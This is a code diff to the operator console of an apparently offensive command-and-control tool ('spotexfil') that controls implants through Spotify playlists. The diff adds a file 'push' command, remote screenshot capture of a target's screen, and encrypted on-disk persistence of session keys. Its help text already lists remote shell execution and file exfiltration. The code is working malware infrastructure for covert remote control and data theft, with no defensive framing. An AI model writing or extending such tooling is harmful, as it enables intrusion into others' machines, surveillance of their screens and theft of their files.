@@ -3,6 +3,7 @@ package c2
 import (
 	"context"
 	"crypto/ecdh"
+	"encoding/base64"
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
@@ -126,10 +127,15 @@ type Operator struct {
 	// Forward secrecy via X25519
 	sessionKeys map[string][]byte // client_id -> ACTIVE session key
 	pendingKeys map[string][]byte // client_id -> session key awaiting implant confirmation
+
+	// Optional session key persistence (opt-in; weakens forward secrecy
+	// across operator restarts in exchange for result recovery)
+	persistSession bool
+	sessionFile    string
 }
 
 // NewOperator creates a new operator.
-func NewOperator(client *spotify.Client, key string, pollIntervalSec int) *Operator {
+func NewOperator(client *spotify.Client, key string, pollIntervalSec int, persistSession ...bool) *Operator {
 	if pollIntervalSec < 15 {
 		pollIntervalSec = 15
 	}
@@ -148,9 +154,13 @@ func NewOperator(client *spotify.Client, key string, pollIntervalSec int) *Opera
 	}
 
 	histFile := ".spotexfil-history.json"
+	sessFile := ".spotexfil-session"
 	if home, err := os.UserHomeDir(); err == nil {
 		histFile = home + "/.spotexfil-history.json"
+		sessFile = home + "/.spotexfil-session"
 	}
+
+	persist := len(persistSession) > 0 && persistSession[0]
 
 	op := &Operator{
 		client:           client,
@@ -165,8 +175,15 @@ func NewOperator(client *spotify.Client, key string, pollIntervalSec int) *Opera
 		pendingKeys:      make(map[string][]byte),
 		historyIdx:       make(map[int]int),
 		historyFile:      histFile,
+		persistSession:   persist,
+		sessionFile:      sessFile,
 	}
 	op.loadHistory()
+	if persist {
+		fmt.Println("[*] Session persistence ENABLED — forward secrecy across " +
+			"restarts is weakened (session keys stored encrypted on disk)")
+		op.loadSessionKeys()
+	}
 	return op
 }
 
@@ -284,6 +301,7 @@ func (op *Operator) PollResults() (map[int]map[string]interface{}, error) {
 					// Implant confirmed the key exchange — promote to active
 					op.sessionKeys[cid] = sk
 					delete(op.pendingKeys, cid)
+					op.saveSessionKeysLocked()
 					fmt.Printf("\n\033[32m[*] Forward secrecy confirmed with %s\033[0m\n",
 						cid[:8])
 					break
@@ -578,6 +596,22 @@ func (op *Operator) Interactive() {
 				continue
 			}
 			op.SendCommand("exfil", map[string]interface{}{"path": arg})
+		case "push":
+			if !op.requireAttached() {
+				continue
+			}
+			op.pushCommand(arg)
+		case "screenshot":
+			if !op.requireAttached() {
+				continue
+			}
+			args := map[string]interface{}{}
+			if arg != "" {
+				if disp, err := strconv.Atoi(arg); err == nil {
+					args["display"] = float64(disp)
+				}
+			}
+			op.SendCommand("screenshot", args)
 		case "sysinfo":
 			if !op.requireAttached() {
 				continue
@@ -756,6 +790,42 @@ func (op *Operator) requireAttached() bool {
 		return false
 	}
 	return true
+}
+
+// pushCommand reads a local file and queues it for transfer to the
+// attached implant: push <local_path> <remote_path>
+func (op *Operator) pushCommand(arg string) {
+	parts := strings.Fields(arg)
+	if len(parts) != 2 {
+		fmt.Println("[!] Usage: push <local_path> <remote_path>")
+		return
+	}
+	localPath, remotePath := parts[0], parts[1]
+
+	content, err := os.ReadFile(localPath)
+	if err != nil {
+		fmt.Printf("[!] Cannot read %s: %v\n", localPath, err)
+		return
+	}
+	maxSize := shared.Proto.C2.MaxResultSize
+	if len(content) > maxSize {
+		fmt.Printf("[!] File too large: %d bytes (max %d)\n", len(content), maxSize)
+		return
+	}
+	if len(content) == 0 {
+		fmt.Println("[!] File is empty")
+		return
+	}
+	if len(content) > 100_000 {
+		fmt.Printf("[!] Note: %d bytes = ~%d playlists, this will take a while\n",
+			len(content), len(content)*4/3/300)
+	}
+
+	fmt.Printf("[*] Pushing %s (%d bytes) -> %s\n", localPath, len(content), remotePath)
+	op.SendCommand("push", map[string]interface{}{
+		"path": remotePath,
+		"data": base64.StdEncoding.EncodeToString(content),
+	})
 }
 
 // interactiveShell provides a remote shell experience.
@@ -1021,6 +1091,7 @@ func (op *Operator) handleCheckinLocked(result map[string]interface{}) *kxJob {
 			clientID[:8])
 		delete(op.sessionKeys, clientID)
 		delete(op.pendingKeys, clientID)
+		op.saveSessionKeysLocked()
 	}
 	pid := 0
 	if p, ok := info["pid"].(float64); ok {
@@ -1137,7 +1208,15 @@ func displayResult(seq int, result map[string]interface{}) {
 	data, _ := result["data"].(string)
 
 	fmt.Printf("\n--- Result seq=%d [%s] status=%s ---\n", seq, module, status)
-	if module == "sysinfo" && status == "ok" {
+	switch {
+	case module == "screenshot" && status == "ok" && strings.HasPrefix(data, "b64:"):
+		// Save to disk instead of flooding the console with base64
+		if path, err := saveScreenshot(seq, data); err != nil {
+			fmt.Printf("[!] Could not save screenshot: %v\n", err)
+		} else {
+			fmt.Printf("[*] Screenshot saved to %s\n", path)
+		}
+	case module == "sysinfo" && status == "ok":
 		var info map[string]interface{}
 		if json.Unmarshal([]byte(data), &info) == nil {
 			for k, v := range info {
@@ -1146,10 +1225,24 @@ func displayResult(seq int, result map[string]interface{}) {
 		} else {
 			fmt.Println(data)
 		}
-	} else {
+	default:
 		fmt.Println(data)
 	}
 	fmt.Println("---")
+}
+
+// saveScreenshot decodes a b64 screenshot result and writes it to disk.
+func saveScreenshot(seq int, data string) (string, error) {
+	raw, err := base64.StdEncoding.DecodeString(strings.TrimPrefix(data, "b64:"))
+	if err != nil {
+		return "", err
+	}
+	path := fmt.Sprintf("screenshot-seq%d-%s.jpg", seq,
+		time.Now().Format("20060102-150405"))
+	if err := os.WriteFile(path, raw, 0600); err != nil {
+		return "", err
+	}
+	return path, nil
 }
 
 func printHelp() {
@@ -1163,6 +1256,8 @@ Commands (requires attached agent):
   ishell          Interactive remote shell (auto-detects bash/powershell)
   shell <cmd>     Execute a single shell command
   exfil <path>    Exfiltrate a file
+  push <l> <r>    Push local file <l> to remote path <r>
+  screenshot [n]  Capture the target's screen (display n, default 0)
   sysinfo         Gather system info
 
 History:
@@ -1235,6 +1330,69 @@ func (op *Operator) FlushHistory() {
 	op.mu.Lock()
 	defer op.mu.Unlock()
 	op.flushHistoryLocked()
+}
+
+// --- Session key persistence (opt-in) ---
+
+// sessionStoreKey derives the encryption key for the on-disk session store.
+func (op *Operator) sessionStoreKey() []byte {
+	return crypto.ComputeHMACSHA256([]byte(op.key), []byte("spotexfil-session-store"))
+}
+
+// loadSessionKeys restores persisted session keys from disk.
+// Entries that fail to decrypt (wrong master key) are skipped.
+func (op *Operator) loadSessionKeys() {
+	data, err := os.ReadFile(op.sessionFile)
+	if err != nil {
+		return // no store yet
+	}
+	var stored map[string]string
+	if err := json.Unmarshal(data, &stored); err != nil {
+		return
+	}
+
+	storeKey := op.sessionStoreKey()
+	restored := 0
+	op.mu.Lock()
+	defer op.mu.Unlock()
+	for cid, encHex := range stored {
+		raw, err := hex.DecodeString(encHex)
+		if err != nil {
+			continue
+		}
+		sk, err := crypto.DecryptFast(raw, storeKey)
+		if err != nil || len(sk) != 32 {
+			continue // wrong master key or corrupt entry
+		}
+		op.sessionKeys[cid] = sk
+		restored++
+	}
+	if restored > 0 {
+		fmt.Printf("[*] Restored %d persisted session key(s) from %s\n",
+			restored, op.sessionFile)
+	}
+}
+
+// saveSessionKeysLocked encrypts and writes the active session keys.
+// No-op unless persistence is enabled. Caller must hold op.mu.
+func (op *Operator) saveSessionKeysLocked() {
+	if !op.persistSession {
+		return
+	}
+	storeKey := op.sessionStoreKey()
+	stored := make(map[string]string, len(op.sessionKeys))
+	for cid, sk := range op.sessionKeys {
+		enc, err := crypto.EncryptFast(sk, storeKey)
+		if err != nil {
+			continue
+		}
+		stored[cid] = hex.EncodeToString(enc)
+	}
+	data, err := json.Marshal(stored)
+	if err != nil {
+		return
+	}
+	_ = os.WriteFile(op.sessionFile, data, 0600)
 }
 
 // recordCommandLocked appends a command to history. Caller must hold op.mu.
